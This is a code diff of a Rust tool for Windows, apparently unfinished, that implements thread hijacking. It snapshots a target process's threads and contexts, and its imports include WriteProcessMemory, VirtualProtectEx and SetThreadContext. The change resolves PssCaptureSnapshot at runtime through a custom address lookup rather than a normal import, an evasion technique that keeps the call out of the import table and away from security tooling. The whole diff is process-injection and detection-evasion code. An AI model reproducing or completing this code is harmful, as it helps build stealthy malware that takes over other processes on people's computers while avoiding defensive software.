@@ -20,12 +20,7 @@ use winapi::{
         winerror::ERROR_SUCCESS,
     },
     um::{
-        debugapi::DebugActiveProcessStop,
-        heapapi::{GetProcessHeap, HeapAlloc, HeapFree},
-        memoryapi::{ReadProcessMemory, VirtualProtectEx, WriteProcessMemory},
-        processthreadsapi::SetThreadContext,
-        //winbase::{DEBUG_PROCESS, DETACHED_PROCESS, NORMAL_PRIORITY_CLASS},
-        winnt::{
+        debugapi::DebugActiveProcessStop, heapapi::{GetProcessHeap, HeapAlloc, HeapFree}, memoryapi::{ReadProcessMemory, VirtualProtectEx, WriteProcessMemory}, processthreadsapi::SetThreadContext, winnt::{
             CONTEXT, 
             HANDLE, 
             HEAP_ZERO_MEMORY, 
@@ -33,24 +28,13 @@ use winapi::{
             MEM_IMAGE, 
             PAGE_EXECUTE_READ,
             PAGE_READWRITE,
-        },
+        }
     },
 };
 
 // Windows-rs imports
 use windows::Win32::System::Diagnostics::ProcessSnapshotting::{
-    PssCaptureSnapshot,
-    PssWalkMarkerCreate,
-    PssWalkMarkerFree,
-    PssWalkSnapshot,
-    HPSS,
-    HPSSWALK,
-    PSS_CAPTURE_THREADS,
-    PSS_CAPTURE_THREAD_CONTEXT,
-    PSS_THREAD_ENTRY,
-    PSS_VA_SPACE_ENTRY,
-    PSS_WALK_THREADS,
-    PSS_WALK_VA_SPACE,
+    PssCaptureSnapshot, PssWalkMarkerCreate, PssWalkMarkerFree, PssWalkSnapshot, HPSS, HPSSWALK, PSS_CAPTURE_FLAGS, PSS_CAPTURE_THREADS, PSS_CAPTURE_THREAD_CONTEXT, PSS_THREAD_ENTRY, PSS_VA_SPACE_ENTRY, PSS_WALK_THREADS, PSS_WALK_VA_SPACE
 };
 
 pub fn get_helper(
@@ -314,6 +298,7 @@ pub fn snap_thread_hijack(
     target_process: *mut winapi::ctypes::c_void,
     rip: Option<*mut winapi_c_void>,
     rsp: Option<*mut winapi_c_void>,
+    kernel32: *mut std_c_void,
 ) -> bool {
     unsafe {
         let mut snapshot_ctx: CONTEXT = zeroed();
@@ -325,18 +310,40 @@ pub fn snap_thread_hijack(
         // Capture snapshot
         let capture_flags = PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT;
         let win32_handle = windows::Win32::Foundation::HANDLE(target_process as _);
-        let pss_result = PssCaptureSnapshot(
-            win32_handle,
-            capture_flags,
-            0x0010_0017,  // CONTEXT_ALL
-            &mut snapshot_handle,
-        );
+
+        //get the function address for PssCaptureSnapshot
+        let pss_capture_snapshot_address = noldr::get_function_address(kernel32, "PssCaptureSnapshot");
+
+        let pss_capture_snapshot = unsafe {
+            let fn_ptr = match pss_capture_snapshot_address {
+                Some(addr) => addr,
+                None => return false, // or handle error appropriately
+            };
+            
+            std::mem::transmute::<_, extern "system" fn(
+                HANDLE,                 // processHandle
+                PSS_CAPTURE_FLAGS,      // captureFlags
+                u32,                    // threadContextFlags
+                *mut HPSS              // snapshotHandle
+            ) -> u32>(fn_ptr)
+        };
+
+        let pss_result = unsafe {
+            pss_capture_snapshot(
+                target_process,                 // Already a *mut c_void
+                capture_flags,  // PSS_CAPTURE_FLAGS enum
+                0x0010_0017,                    // threadContextFlags as u32
+                &mut snapshot_handle            // *mut HPSS
+            )
+        };
 
         if pss_result != 0 {
             eprintln!("[!] PssCaptureSnapshot failed: Win32 error {}", winapi::um::errhandlingapi::GetLastError());
             return false;
         }
         //println!("[+] Snapshot captured successfully");
+
+        //YOU ARE HERE
 
         // Create walk marker
         let pss_result = PssWalkMarkerCreate(None, &mut walk_marker_handle);
